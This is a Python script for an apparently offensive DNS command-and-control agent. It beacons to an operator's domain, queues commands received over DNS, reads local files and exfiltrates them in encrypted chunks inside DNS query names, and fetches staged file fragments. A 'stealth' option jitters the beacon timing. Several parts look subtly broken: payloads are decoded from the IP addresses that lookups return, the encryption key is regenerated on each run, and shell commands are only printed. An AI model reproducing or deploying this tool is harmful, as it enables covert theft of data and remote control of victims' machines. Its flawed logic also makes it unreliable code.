#!/usr/bin/env python3
# dns_c2.py - Advanced DNS C2 with staging and multi-agent logging

import socket
import base64
import time
import random
import hashlib
import argparse
import threading
from cryptography.fernet import Fernet
from datetime import datetime

AGENT_ID = f"agent{random.randint(1000,9999)}"
SHARED_KEY = Fernet.generate_key()
fernet = Fernet(SHARED_KEY)

TASK_QUEUE = []
RECEIVED_FILES = {}

def encode_data(data):
    return base64.urlsafe_b64encode(fernet.encrypt(data.encode())).decode()

def decode_data(enc):
    try:
        return fernet.decrypt(base64.urlsafe_b64decode(enc.encode())).decode()
    except Exception:
        return "DECRYPTION_ERROR"

def send_dns_query(payload, domain):
    fqdn = f"{payload}.{domain}"
    try:
        socket.gethostbyname(fqdn)
        return True
    except Exception:
        return False

def beacon_loop(domain, interval, stealth):
    while True:
        if stealth:
            time.sleep(random.randint(interval, interval+5))
        else:
            time.sleep(interval)

        status = f"{AGENT_ID}_READY"
        enc = encode_data(status)
        send_dns_query(enc, domain)
        print(f"[{datetime.now()}] Beacon sent: {status}")

def check_commands(domain):
    try:
        response = socket.gethostbyname(f"cmd.{domain}")
        cmd = decode_data(response)
        if cmd not in TASK_QUEUE:
            TASK_QUEUE.append(cmd)
            print(f"[+] Queued command: {cmd}")
    except:
        pass

def execute_staged_tasks(domain):
    while True:
        if TASK_QUEUE:
            cmd = TASK_QUEUE.pop(0)
            print(f"[!] Executing command: {cmd}")
            if cmd.startswith("download:"):
                _, file_id = cmd.split(":")
                download_file_fragments(file_id, domain)
            elif cmd.startswith("exfil:"):
                _, path = cmd.split(":")
                try:
                    with open(path, "r") as f:
                        data = f.read()
                    send_data_chunks(data, domain)
                except:
                    print(f"[x] Failed to read {path}")
            else:
                print(f"[i] Executed custom shell command: {cmd}")
        time.sleep(5)

def send_data_chunks(data, domain):
    chunks = [data[i:i+30] for i in range(0, len(data), 30)]
    for i, chunk in enumerate(chunks):
        enc = encode_data(f"{AGENT_ID}|chunk{i}|{chunk}")
        send_dns_query(enc, domain)
        time.sleep(1)

def download_file_fragments(file_id, domain):
    print(f"[+] Initiating download of file {file_id}")
    for i in range(1, 10):
        try:
            fragment_host = f"frag{i}.{file_id}.{domain}"
            fragment_data = socket.gethostbyname(fragment_host)
            decoded = decode_data(fragment_data)
            RECEIVED_FILES.setdefault(file_id, []).append(decoded)
            print(f"  -> Received fragment {i}: {decoded[:10]}...")
        except:
            break
    print(f"[✓] Download completed. Total fragments: {len(RECEIVED_FILES[file_id])}")
    with open(f"{file_id}_reconstructed.txt", "w") as f:
        f.write("".join(RECEIVED_FILES[file_id]))

def log_agent_activity(log_file):
    with open(log_file, "a") as f:
        f.write(f"{datetime.now()} - Agent: {AGENT_ID} - Active\n")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--domain", required=True, help="C2 domain")
    parser.add_argument("--interval", type=int, default=10, help="Beacon interval")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--log", default="agent_dashboard.log", help="Log file")
    args = parser.parse_args()

    print(f"[*] Starting DNS C2 Beacon | Agent: {AGENT_ID}")
    print(f"[*] Using shared key: {SHARED_KEY.decode()}")
    log_agent_activity(args.log)

    threading.Thread(target=beacon_loop, args=(args.domain, args.interval, args.stealth), daemon=True).start()
    threading.Thread(target=execute_staged_tasks, args=(args.domain,), daemon=True).start()

    try:
        while True:
            check_commands(args.domain)
            time.sleep(6)
    except KeyboardInterrupt:
        print("\n[!] Terminated by user.")

if __name__ == "__main__":
    main()
